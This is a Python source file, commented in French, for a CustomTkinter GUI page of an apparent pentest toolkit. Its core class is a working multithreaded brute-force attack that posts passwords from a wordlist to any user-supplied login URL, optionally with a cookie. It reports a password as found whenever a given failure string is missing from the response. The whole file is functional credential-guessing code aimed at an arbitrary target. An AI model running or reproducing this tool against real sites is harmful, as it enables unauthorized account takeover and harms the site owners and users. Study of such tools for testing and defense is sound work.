import requests
import customtkinter as ctk
from tkinter import filedialog, messagebox
from concurrent.futures import ThreadPoolExecutor
import time
import threading
import queue
from shared import navigate_to_page  # Si nécessaire pour réinitialiser la page

class BruteForceAttack:
    def __init__(self, url, username, password_file, login_failed_string, cookie_value=None, threads=10):
        """
        Initialisation de l'attaque brute force.
        
        :param url: URL cible pour l'attaque.
        :param username: Nom d'utilisateur à bruteforcer.
        :param password_file: Fichier contenant les mots de passe à tester.
        :param login_failed_string: Chaîne qui indique un échec de connexion.
        :param cookie_value: Valeur optionnelle pour un cookie.
        :param threads: Nombre de threads simultanés.
        """
        self.url = url
        self.username = username
        self.password_file = password_file
        self.login_failed_string = login_failed_string
        self.cookie_value = cookie_value
        self.threads = threads

    def try_login(self, session, password, result_queue):
        """Teste un mot de passe en envoyant une requête HTTP POST."""
        data = {'username': self.username, 'password': password, 'Login': 'submit'}
        try:
            if self.cookie_value:
                response = session.post(self.url, data=data, cookies={'Cookie': self.cookie_value})
            else:
                response = session.post(self.url, data=data)

            # Vérification du statut HTTP
            if response.status_code != 200:
                result_queue.put(f"Erreur HTTP {response.status_code} pour le mot de passe {password}")
                return

            # Vérification du message d'échec dans la réponse HTML
            if self.login_failed_string.lower() in response.text.lower():
                result_queue.put(f"Échec de la connexion avec le mot de passe : {password}")
            else:
                result_queue.put(f"[+] Found Username: {self.username}\n[+] Found Password: {password}")
                return
        except Exception as e:
            result_queue.put(f"Erreur lors du test du mot de passe {password}: {e}")
            return

    def run(self, result_queue):
        """Lance l'attaque brute force."""
        session = requests.Session()
        try:
            with open(self.password_file, 'r') as file:
                passwords = file.readlines()

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for password in passwords:
                    executor.submit(self.try_login, session, password.strip(), result_queue)

        except Exception as e:
            result_queue.put(f"Une erreur est survenue : {e}")


class BruteForcePage:
    def __init__(self, container):
        """Initialise l'interface graphique et les composants."""
        self.container = container
        self.url_entry = None
        self.username_entry = None
        self.password_file_entry = None
        self.login_failed_entry = None
        self.cookie_entry = None
        self.results_textbox = None
        self.result_queue = queue.Queue()
        self._create_ui()

    def _create_ui(self):
        """Crée les éléments de l'interface graphique."""
        navigate_to_page(self.container, self.show_page)

    def show_page(self, container):
        """Affiche la page brute force dans le conteneur."""
        # Colonne pour l'historique
        vuln_list_frame = ctk.CTkFrame(container, fg_color="#1e1e1e", width=300)
        vuln_list_frame.pack(side="left", fill="y", padx=10, pady=10)

        vuln_list_label = ctk.CTkLabel(vuln_list_frame, text="Historique des attaques", text_color="white", font=("Helvetica", 16))
        vuln_list_label.pack(pady=10)

        vuln_list = ctk.CTkTextbox(vuln_list_frame, fg_color="#2e2e2e", text_color="white", font=("Helvetica", 14), wrap="none", state="disabled")
        vuln_list.pack(fill="both", expand=True)

        # Zone principale
        main_frame = ctk.CTkFrame(container, fg_color="#2e2e2e")
        main_frame.pack(side="right", fill="both", expand=True, padx=10, pady=10)

        self._create_input_fields(main_frame)

        # Zone des résultats
        results_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
        results_frame.pack(pady=10, padx=20, fill="both", expand=True)

        self.results_textbox = ctk.CTkTextbox(
            results_frame,
            fg_color="#1e1e1e",
            text_color="white",
            font=("Helvetica", 14),
            wrap="word",
            state="normal",
        )
        self.results_textbox.pack(fill="both", pady=10, padx=20, expand=True)
        self.results_textbox.configure(state="disabled")  # Initialement désactivé pour être vide

        # Boutons en bas
        bottom_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
        bottom_frame.pack(side="bottom", fill="x", pady=10, padx=20)

        # Bouton pour lancer l'attaque
        attack_button = ctk.CTkButton(
            bottom_frame, text="Lancer l'attaque", command=self.run_brute_force, fg_color="#D32F2F", hover_color="#C62828", font=("Helvetica", 16)
        )
        attack_button.pack(side="right", padx=5)

    def _create_input_fields(self, main_frame):
        """Crée les champs de saisie pour l'URL, l'utilisateur, le fichier de mots de passe, etc."""
        # Barre pour entrer l'URL
        url_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
        url_frame.pack(pady=5, padx=20, anchor="n", fill="x")

        url_label = ctk.CTkLabel(url_frame, text="URL cible :", text_color="white", font=("Helvetica", 14))
        url_label.pack(side="left", padx=5)

        self.url_entry = ctk.CTkEntry(url_frame, font=("Helvetica", 14), width=400)
        self.url_entry.pack(side="left", padx=5, fill="x", expand=True)

        # Barre pour entrer le nom d'utilisateur
        username_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
        username_frame.pack(pady=5, padx=20, anchor="n", fill="x")

        username_label = ctk.CTkLabel(username_frame, text="Nom d'utilisateur :", text_color="white", font=("Helvetica", 14))
        username_label.pack(side="left", padx=5)

        self.username_entry = ctk.CTkEntry(username_frame, font=("Helvetica", 14), width=400)
        self.username_entry.pack(side="left", padx=5, fill="x", expand=True)

        # Sélectionner le fichier de mots de passe
        password_file_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
        password_file_frame.pack(pady=5, padx=20, anchor="n", fill="x")

        password_file_label = ctk.CTkLabel(password_file_frame, text="Fichier de mots de passe :", text_color="white", font=("Helvetica", 14))
        password_file_label.pack(side="left", padx=5)

        self.password_file_entry = ctk.CTkEntry(password_file_frame, font=("Helvetica", 14), width=400)
        self.password_file_entry.pack(side="left", padx=5, fill="x", expand=True)

        def browse_file():
            file_path = filedialog.askopenfilename(title="Sélectionner un fichier de mots de passe", filetypes=[("Text Files", "*.txt")])
            if file_path:
                self.password_file_entry.insert(0, file_path)

        browse_button = ctk.CTkButton(password_file_frame, text="Parcourir", command=browse_file)
        browse_button.pack(side="left", padx=5)

        # Barre pour entrer la chaîne d'échec
        login_failed_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
        login_failed_frame.pack(pady=5, padx=20, anchor="n", fill="x")

        login_failed_label = ctk.CTkLabel(login_failed_frame, text="Chaîne d'échec :", text_color="white", font=("Helvetica", 14))
        login_failed_label.pack(side="left", padx=5)

        self.login_failed_entry = ctk.CTkEntry(login_failed_frame, font=("Helvetica", 14), width=400)
        self.login_failed_entry.pack(side="left", padx=5, fill="x", expand=True)

        # Barre pour entrer la valeur du cookie
        cookie_frame = ctk.CTkFrame(main_frame, fg_color="#2e2e2e")
        cookie_frame.pack(pady=5, padx=20, anchor="n", fill="x")

        cookie_label = ctk.CTkLabel(cookie_frame, text="Valeur du cookie (optionnel) :", text_color="white", font=("Helvetica", 14))
        cookie_label.pack(side="left", padx=5)

        self.cookie_entry = ctk.CTkEntry(cookie_frame, font=("Helvetica", 14), width=400)
        self.cookie_entry.pack(side="left", padx=5, fill="x", expand=True)

    def run_brute_force(self):
        """Lance l'attaque brute force en utilisant les informations saisies."""
        url = self.url_entry.get()
        username = self.username_entry.get()
        password_file = self.password_file_entry.get()
        login_failed_string = self.login_failed_entry.get()
        cookie_value = self.cookie_entry.get()

        # Vérifie que tous les champs nécessaires sont remplis
        if not url or not username or not password_file or not login_failed_string:
            messagebox.showerror("Erreur", "Veuillez remplir tous les champs obligatoires.")
            return

        # Efface les anciens résultats avant d'afficher les nouveaux
        self.results_textbox.configure(state="normal")
        self.results_textbox.delete(1.0, "end")  # Efface tout le contenu
        self.results_textbox.configure(state="disabled")
        
        # Lance l'attaque brute force
        brute_force_attack = BruteForceAttack(
            url, username, password_file, login_failed_string, cookie_value, threads=10
        )

        # Démarrer l'attaque dans un thread
        threading.Thread(target=brute_force_attack.run, args=(self.result_queue,)).start()

        # Traiter les résultats
        self._process_results()

    def _process_results(self):
        """Traite les résultats de l'attaque brute force."""
        try:
            while not self.result_queue.empty():
                result = self.result_queue.get_nowait()
                self.results_textbox.configure(state="normal")
                self.results_textbox.insert("end", result + "\n")
                self.results_textbox.configure(state="disabled")
            self.results_textbox.yview("end")  # Défile vers la fin
            self.container.after(500, self._process_results)  # Recommande la mise à jour
        except queue.Empty:
            pass